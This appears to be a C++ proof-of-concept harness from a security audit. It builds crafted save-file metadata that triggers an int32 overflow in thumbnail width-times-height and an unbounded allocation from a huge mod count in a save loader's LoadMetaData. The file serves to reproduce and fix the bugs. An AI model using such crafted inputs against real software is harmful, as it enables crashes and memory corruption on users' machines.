// P3 proof: Save::SaveLoad::LoadMetaData (saveload_loadmeta.cpp:313) on a crafted save metadata
// block: the thumbnail width and height are read from the save and multiplied in int32.
// argv[1]: "thumb" = width 0x10000, height 0x10000 (w*h overflows)
//          "mods"  = version 3 with a mod count of 0x7fffffff (unbounded SetSize, :339)
#include "save/SaveLoad.h"
#include "system/String.h"
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <new>
#include <vector>

int main(int argc, char** argv) {
    const bool mods = argc > 1 && std::strcmp(argv[1], "mods") == 0;
    std::vector<uint8_t> p;
    auto put32 = [&](std::vector<uint8_t>& v, uint32_t x) { for (int i = 0; i < 4; ++i) v.push_back(uint8_t(x >> (8 * i))); };
    auto put16 = [&](std::vector<uint8_t>& v, uint16_t x) { v.push_back(uint8_t(x)); v.push_back(uint8_t(x >> 8)); };
    put32(p, 0xAAAAAAAAu);            // BinaryReader: magic
    put32(p, 0);                      //               word20
    put32(p, mods ? 3 : 1);           //               version
    put32(p, 0x80000000u);            // description: empty UTF-8 String
    put32(p, mods ? 1 : 0x10000);     // width
    put32(p, mods ? 1 : 0x10000);     // height
    if (mods) {
        put32(p, 0xFFFFFFFFu);        // thumbnail 1x1x4 bytes
        put32(p, 3);                  // the second version write
        put32(p, 0x7fffffffu);        // mod count
    }
    p.resize(p.size() + 64, 0);
    std::vector<uint8_t> blob;
    put32(blob, 1);
    put32(blob, 12);
    put16(blob, 0);
    put16(blob, static_cast<uint16_t>(p.size()));
    blob.insert(blob.end(), p.begin(), p.end());

    alignas(16) static unsigned char mem[sizeof(Save::SaveLoad)];
    std::memset(mem, 0, sizeof(mem));
    Save::SaveLoad* sl = reinterpret_cast<Save::SaveLoad*>(mem);
    sl->_embeddedState._data = blob.data();
    sl->_embeddedState._size = static_cast<uint32_t>(blob.size());
    System::String desc;
    void* pixels = nullptr;
    int w = 0, h = 0, ver = 0;
    Collection::Array<Save::SaveLoad::ModInfo> list;
    sl->LoadMetaData(desc, &pixels, w, h, ver, list);
    std::printf("LoadMetaData -> w %d h %d ver %d mods %d\n", w, h, ver, list._size);
    return 0;
}
